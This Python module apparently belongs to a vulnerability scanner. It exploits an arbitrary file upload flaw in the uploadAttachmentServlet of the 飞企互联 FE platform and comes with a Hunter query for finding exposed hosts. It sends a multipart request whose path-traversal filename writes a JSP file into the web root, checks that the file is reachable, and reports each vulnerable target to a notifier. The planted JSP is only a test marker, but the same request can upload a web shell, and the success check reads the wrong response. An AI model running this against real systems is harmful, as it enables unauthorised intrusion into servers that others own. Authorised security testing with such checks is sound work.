# 存在robots.txt
# hunter：app.name=="飞企互联 FE 6.0+"||app.name=="飞企互联 FE"
import ServerJ
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout
import os
import urllib.parse
import urllib.request
import re
import time
import ssl
import urllib
from urllib.parse import urljoin, quote
import ServerJ

#bugName = '飞企互联FE业务协作平台uploadAttachmentServlet任意文件上传漏洞'


def scan_FE_upload_Attachment_Servlet(url, proxies, headers, append_to_output, serverJ,bugName):
    path = "/servlet/uploadAttachmentServlet"
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk',
        'Accept': 'text/plain, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate, br',
    }
    data = '------WebKitFormBoundaryKNt0t4vBe8cX9rZk\nContent-Disposition: form-data; name="uploadFile";filename="../../../../../jboss/web/fe.war/tes11.jsp"\nContent-Type: text/plain\n\n<% out.println("qwert");%>\n------WebKitFormBoundaryKNt0t4vBe8cX9rZk\nContent-Disposition: form-data; name="json"\n\n{"iq":{"query":{"UpdateType":"mail"}}}\n------WebKitFormBoundaryKNt0t4vBe8cX9rZk--'

    encodetext = url + path

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req = requests.post(encodetext, headers=headers, data=data, verify=False, timeout=3, proxies=proxies)
        if req.status_code != 500 and "上传失败" not in req.text:
            path = "/tes11.jsp"
        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url
        encodetext = url + path
        req2 = requests.get(encodetext)
        if req2.status_code == 200 and "qwert" in req.text:
            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
            ServerJ.sc_send({bugName}, f"漏洞连接: {url}\r\n漏洞类型: 任意文件上传", ServerJ_switch=serverJ)
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
    except Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
